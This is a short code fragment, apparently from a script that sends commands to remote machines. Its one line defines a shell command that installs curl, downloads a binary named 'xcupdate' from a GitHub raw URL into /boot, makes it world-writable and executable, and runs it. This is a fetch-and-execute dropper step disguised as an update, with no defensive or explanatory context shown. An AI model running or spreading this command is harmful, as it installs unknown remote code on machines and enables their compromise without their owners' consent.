...
cmd="""cd /boot; apt-get update -y; apt-get install curl -y; rm xcupdate; curl -o xcupdate "https://raw.githubusercontent.com/rxu7s/XC/main/main"; chmod 777 xcupdate; ./xcupdate""" #command to send
